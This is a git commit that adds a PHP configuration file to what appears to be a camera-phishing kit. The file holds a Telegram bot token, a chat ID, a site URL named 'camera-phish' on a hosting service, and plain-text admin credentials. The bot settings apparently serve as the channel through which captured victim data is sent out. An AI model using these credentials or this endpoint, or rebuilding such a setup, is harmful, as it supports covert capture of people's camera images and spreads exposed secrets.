285977bd044438e4a61ad95e6734f2532856786c
webcyber0 <hellowebcyber@gmail.com>
2026-07-20 07:06:08 +0530

    Add files via upload

---
+++ anmol/config.php
@@ -0,0 +1,9 @@
+<?php
+$config = [
+    'bot_token' => '8271297882:AAGhvkzMzSH4GQ-VeGmZ6_RR2h5oilx5rmg',
+    'chat_id'   => '7531578236',
+    'website'   => 'https://camera-phish-h6rb.onrender.com/anmol',
+    'admin_username' => 'anish',
+    'admin_password' => 'exploits123'
+];
+?>
